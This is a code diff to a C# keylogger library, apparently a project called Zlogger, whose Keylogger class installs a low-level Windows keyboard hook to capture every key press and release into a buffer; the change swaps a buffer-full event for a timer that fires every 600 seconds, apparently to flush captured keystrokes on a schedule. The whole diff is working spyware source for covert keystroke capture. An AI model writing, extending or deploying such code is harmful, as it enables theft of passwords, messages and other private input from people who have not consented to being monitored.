@@ -2,6 +2,7 @@
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Timers;
 
 namespace Rodjenihm.Zlogger.Core
 {
@@ -11,9 +12,15 @@ namespace Rodjenihm.Zlogger.Core
         private readonly HOOKPROC keyboardHookProc = null;
         public string LogDir { get; set; } = string.Empty;
         public StringBuilder Buffer { get; } = new StringBuilder();
+        public double Interval { get; set; } = 600;
+        private readonly Timer timer = new Timer();
 
         public Keylogger()
         {
+            timer.Interval = 1000 * Interval;
+            timer.Enabled = true;
+            timer.Elapsed += OnIntervalElapsed;
+
             hook = new LowLevelKeyboardHook();
             keyboardHookProc = (nCode, wParam, lParam) =>
             {
@@ -22,13 +29,13 @@ namespace Rodjenihm.Zlogger.Core
                     var vkCode = Marshal.ReadInt32(lParam);
                     var keyEventArgs = new KeyEventArgs { VkCode = vkCode };
 
-                    if (wParam == (IntPtr)WindowsMessages.WM_KEYDOWN) OnKeyDown(this, keyEventArgs);
-                    if (wParam == (IntPtr)WindowsMessages.WM_KEYUP) OnKeyUp(this, keyEventArgs);
-
-                    if (Buffer.Length > 100)
+                    if (wParam == (IntPtr)WindowsMessages.WM_KEYDOWN)
                     {
-                        OnBufferFull(this);
-                        Buffer.Clear();
+                        OnKeyDown(this, keyEventArgs);
+                    }
+                    if (wParam == (IntPtr)WindowsMessages.WM_KEYUP)
+                    {
+                        OnKeyUp(this, keyEventArgs);
                     }
                 }
 
@@ -54,7 +61,7 @@ namespace Rodjenihm.Zlogger.Core
 
         public event Action<Keylogger, KeyEventArgs> KeyDown;
         public event Action<Keylogger, KeyEventArgs> KeyUp;
-        public event Action<Keylogger> BufferFull;
+        public event EventHandler IntervalElapsed;
 
         protected virtual void OnKeyDown(Keylogger sender, KeyEventArgs e)
         {
@@ -66,9 +73,9 @@ namespace Rodjenihm.Zlogger.Core
             KeyUp?.Invoke(sender, e);
         }
 
-        protected virtual void OnBufferFull(Keylogger keylogger)
+        protected virtual void OnIntervalElapsed(object sender, EventArgs e)
         {
-            BufferFull?.Invoke(keylogger);
+            IntervalElapsed?.Invoke(sender, e);
         }
     }
 }
